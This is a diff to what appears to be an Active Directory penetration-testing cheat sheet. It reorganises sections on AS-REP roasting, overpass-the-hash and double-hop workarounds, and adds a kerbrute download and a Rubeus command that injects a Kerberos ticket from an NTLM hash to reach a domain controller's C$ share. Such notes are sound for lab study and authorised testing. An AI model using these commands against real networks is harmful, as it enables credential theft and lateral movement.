@@ -412,11 +412,6 @@ raiseChild.py -target-exec <DC_IP> <TARGET_DOMAIN>/<USER>
 
 # Getting Access Credentials
 
-1. **AS-REP roast** (w/o creds) — [just need usernames](#user-enumeration)
-    - Crack hashes → get a domain user
-2. **AS-REP roast again** (w/ creds) — catch any users you missed
-3. **Kerberoast** (w/ creds) — now you can hit SPN accounts
-
 ## ASREPROASTING (cracking TGT)
 
 When Kerberos pre-authentication is disabled, an attacker can request encrypted authentication responses without needing the user's password and later attempt offline password cracking.
@@ -438,6 +433,8 @@ Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,use
 
 ```bash
 # Linux Alternative (Kerbrute)
+sudo wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O /sbin/kerbrute && sudo chmod +x /sbin/kerbrute
+
 # Brute-force users AND auto-check for AS-REP Roasting
 kerbrute userenum -d <DOMAIN> --dc <DC_IP> <USERLIST>
 ```
@@ -908,7 +905,7 @@ Reference: https://github.com/gdedrouas/Exchange-AD-Privesc
 
 # Escalating and Pivoting
 
-## Pass the Key (PtK) / OverPass the Hash (OtH)
+## Pass the Key (PtK) OverPass the Hash (OtH)
 
 *Concept: Request a Kerberos Ticket (TGT) using an NTLM hash or AES Key, rather than using the NTLM protocol directly.*
 
@@ -1044,7 +1041,22 @@ Use these commands to confirm you are in a "Double Hop" / Network Logon state wh
 
 ### Mitigation Methods
 
-#### Method 1: Pass Credential Object (Handout / Native)
+#### Rubeus / Overpass-the-Hash
+
+Best if you have a Hash or AES Key. Injects a TGT into your current session, "fixing" the double hop instantly.
+
+```powershell
+# 1. Inject a TGT using the hash (or AES key)
+.\Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt
+
+# 2. Verify
+klist # You now have a krbtgt ticket
+
+# 3. Pivot
+ls \\<DC_NAME>\C$ # Works natively now
+```
+
+#### Pass Credential Object
 
 Best for "Living off the Land" without uploading tools. Requires knowing the plaintext password.
 
@@ -1060,7 +1072,7 @@ Invoke-Command -ComputerName <MACHINE_NAME> -Credential $cred -ScriptBlock { Get
 Enter-PSSession -ComputerName <MACHINE_NAME> -Credential $cred
 ```
 
-#### Method 2: Register PSSession Configuration (Admin)
+#### Register PSSession Configuration (Admin)
 
 Requires Admin on the Jump Box. Sets up a permanent endpoint that auto-authenticates.
 
@@ -1075,22 +1087,7 @@ Enter-PSSession -ComputerName <MACHINE_NAME> -ConfigurationName "<SESSION_NAME>"
 klist # You should now see the krbtgt ticket
 ```
 
-#### Method 3: Rubeus / Overpass-the-Hash (Attacker / Modern)
-
-Best if you have a Hash or AES Key. Injects a TGT into your current session, "fixing" the double hop instantly.
-
-```powershell
-# 1. Inject a TGT using the hash (or AES key)
-.\Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt
-
-# 2. Verify
-klist # You now have a krbtgt ticket
-
-# 3. Pivot
-ls \\<DC_NAME>\C$ # Works natively now
-```
-
-#### Method 4: Mimikatz PtH (Legacy / Risky in WinRM)
+#### Mimikatz PtH
 
 Mimikatz usually spawns a new window (which fails in WinRM). You must force it to run a command in the same console.
 
